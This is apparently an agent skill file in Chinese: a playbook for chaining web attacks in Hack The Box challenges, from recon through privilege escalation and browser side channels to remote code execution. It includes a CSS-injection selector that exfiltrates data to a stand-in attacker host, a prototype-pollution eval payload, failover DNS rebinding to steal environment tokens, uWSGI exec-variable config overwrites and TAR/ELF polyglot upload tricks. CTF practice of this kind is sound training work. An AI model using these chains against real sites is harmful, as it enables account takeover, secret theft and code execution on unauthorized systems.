---
name: 'challenge-web-chain'
description: 'HTB Insane Web 多级链:源码/Dockerfile 侦察→权限提升(竞态/ACL/CSRF)→浏览器通道(clobbering/SW/原型污染/XS-Leak/rebinding)→缓存投毒→polyglot 上传 RCE（检索词：challenge web chain）'
whenToUse: 'HTB challenges 或靶机的多级 Web 链(带源码/bot/Dockerfile)时:按链式决策树逐级升级到 RCE/flag。'
metadata: { domain: web, tier: T1 }
---

# Web 多级链 playbook(NovaCore + ApexSurvive + OOPArtDB 沉淀)

> Insane Web = 3~6 级链,每级一个原语;先画目标链(到 flag 缺什么:身份→token→越权→RCE),再逐级凑原语。

## 0. 开局侦察(顺序固定,30 分钟内完成)

1. **Dockerfile/compose**:钉的版本号(反代 Traefik 2.10.4→CVE-2024-45410 头剥离;Chrome 93→SW 不查 SameSite)全部当 CVE/行为差异信号查一遍。
2. **CSP 与响应头全集**:`unsafe-eval` 在=原型污染可执行;`default-src 'self'`=外带走同源接口;`frame-ancestors 'none'`+缺 COOP=窗口引用类 leak;有没有 `frame-ancestors` 决定能不能 iframe 计时。
3. **sanitizer 配置**:DOMPurify 的 FORBID_ATTR 只禁属性,`<style>`/`<img>` 在 html profile 下存活;"已消毒"注入点先读配置找漏网元素。
4. **bot 行为**:定时以 admin 访问哪个页面、怎么被诱导、能活几秒(决定 rebinding 用 TTL 型还是 failover 型)、selenium/js-flags 参数封了什么。
5. **用户分层与 ACL**:internal/researcher/admin 各差什么;中间件只验 isLoggedIn 不验资源级 accessLevel = 知道 id 即水平越权。

## 1. 权限提升原语库

| 信号 | 原语 |
|---|---|
| 改邮箱/验证流程,发信与写库各读不同时点状态 | HTTP/2 单连接并发竞态:token 绑定旧身份、邮件发往新地址(ApexSurvive httpx AsyncClient 两请求同发) |
| 按邮箱域分层(internal/external) | 竞态错位后用外部邮箱收内部验证链接 |
| 中间件只验登录不验资源 ACL | 拿到/猜出主键 id 即越权读 flag(OOPArtDB /view/:id) |
| cookie SameSite=Lax + 无 CSRF token | Chrome "Lax+POST" 2 分钟豁免:bot 刚登录即被跨站 POST 代注册/代改 |
| 信任头(X-Real-IP 类)缺失即放行的 fail-open 装饰器 | hop-by-hop 头剥离 CVE 让请求不带头直达后端,以内部身份进入(NovaCore) |
| 验证 token 每次登录轮换 | 泄漏与消耗必须串进同一次浏览器会话(泄漏→socket 推送→自动 submit) |

## 2. 浏览器通道原语库(无 XSS 时照样打)

1. **DOM clobbering**:`<a id=xxx>` 伪造 window 变量;`<embed name=getElementById>` 破坏原生方法逼进 catch 分支;属性 clobbering(`<a id=LOG_LEVEL int="1/../../path">`)向 fetch URL 注入路径穿越。C 端按空白切分解析时,payload 内空格用 `/` 替代。
2. **Service Worker 劫持**:SW 注册参数取自页面 DOM(`$('#host').text()`)+ SW 内 `importScripts(${host}/...)` 拼接 → clobber host 重定向 SW 脚本;SW 上下文用 `cookieStore.get()` 读非 httponly cookie;Chrome<97 的 SW 不执行 SameSite=Strict → 严格 cookie 的偷取通道。
3. **原型污染 → eval**:递归 `merge()` + eval 字符串拼接是标准 gadget 对;`{"__proto__":{"length":"alert();//"}}` 类污染被拼接进 eval。CSP 允许 unsafe-eval 才可行;拒外联时 payload 内 `fetch('/同源可写接口', cookie)` 再轮询读回(自建 exfil 存储点)。
4. **CSS 注入 exfil**:变量式选择器 `input[value^="pfx"]{--i:url(//attacker/?e=..)}` + `background:var(--i)` 逐字符带回;Chrome 93 无 `html:has`,必须用 var() 版工具。
5. **XS-Leak oracle**(严格 CSP/无 XSS 时):解析器差分(`URLSearchParams.get` 取首值+解码 vs `location.search.includes` 字面子串)→ 条件渲染注入 `<img src=/logout>`(GET 无 CSRF 防护,免费跨站状态改变)→ 对**另一个可缓存页面**做 `fetch(url, {mode:'no-cors', cache:'force-cache'})` 计时(<30ms=命中)。🔴 no-cache 的目标页不能直接计时,让目标状态改变登录态,再测登录才有 200 的代理页。
6. **DNS rebinding(读 localhost-only 接口)**:bot 只活几秒 → **failover 型**:A 记录 `[自IP, 0.0.0.0]` + kill 自己的服务器 → fetch failover 到 0.0.0.0(=localhost)且域名未变满足 SOP → 读 /debug 类接口 dump 的 `process.env` 拿 REFERRAL_TOKEN。🔴 TTL 型对短命 bot 无效(Chrome DNS 缓存 60s+)。

## 3. 服务端内存/缓存投毒(链中出现 C/自写后端时)

- 固定大小全局记录数组 + 无界 strcpy/sprintf:线性溢出改写**下一条记录**的 key/value;偏移 = 记录长 − 字段已占字符数,先建两条记录再溢出。
- 改 key 冒充别的属主(user:1)+改 value 注入 HTML = 缓存投毒;配合模板 `|safe` + admin bot = 存储型 XSS 通道。
- 🔴 `sscanf %s` 按空白切分:payload 禁空格;溢出偏移错一位即失败,逐字段实算。
- 已知反代 CVE 的头剥离:先本地起同版本验证头部真能被剥掉再上。

## 4. RCE 收尾(文件上传/执行点审计)

1. 文件名不过滤(允许 `.`/`/`)+ `os.path.join(base, filename)` = 任意路径写;目标:覆盖 uwsgi.ini(uWSGI `@(exec://cmd)` 魔法变量=命令执行,再覆盖任一 .py 触发 reload)、覆盖插件目录(NovaCore /run_plugin 用 readelf 验 ELF)、.htaccess 等。
2. 内容校验器决定 polyglot 方向:exiftool "file type: TAR" → **TAR/ELF polyglot**:ELF magic 在 0,TAR magic 在 0x101;目录名 `$'\x7FELF'` 让 TAR name 字段开头喂 ELF magic;ELF 内预埋牺牲段(`.fill 10240,1,0x66` + `ld -T` 排到 .text 前)承接 TAR 头;`dd conv=notrunc` 拼合后**必须重算 TAR chksum**(512 字节求和,chksum 字段按空格计,八进制文本写回)。
3. EXIF 夹带时换行写 `&#x0a;` 而非真实换行;payload 保持合法过校验器。

## 5. 🔴 坑(跨题高频)

- CSP 读全、sanitizer 配置读全、Dockerfile 版本号全查——三个"读全"能省 2 小时。
- flash/自定义参数必须排在**服务器追加参数之前**(服务器 append 到 URL 末尾)。
- token 每次登录轮换 → 泄漏与消耗必须一气呵成,否则重打。
- report bot 进外部页面的通道往往藏在参数的路径操纵里(productID=`1../../../external?url=`)。
- 现成 XSS/exfil 工具默认按新 Chrome 写;旧版本(93)API 缺失要手改。
- 只覆盖 uwsgi.ini 不触发重启,要同时覆盖 .py 触发 reload。
- DOMPurify 无 bypass + CSP 严 = 明确信号,别死磕 XSS,转 XS-Leak/rebinding 通道。

## 6. 链式决策树

```
读源码+Dockerfile+响应头+bot 配置 →
├─ 有已知 CVE 的组件 → 头剥离/解析差分 先做(常是入口)
├─ 到 flag 缺身份 → 竞态(验证流程)/Lax+POST CSRF/域分层
├─ 缺泄漏(localhost 接口/env) → failover rebinding / /debug 审计
├─ 要 admin 动作 → 注入通道(clobbering/SW/CSS/<img>) 组 oracle
├─ 要 flag 内容 → ACL 遗漏 + id 泄漏(XS-Leak 逐字符)
├─ 要 RCE → 上传审计:文件名过滤? 内容校验器? 可覆盖的执行配置?
└─ 每级原语先在本地容器验证再串链;链上任一级失败先单测该级
```
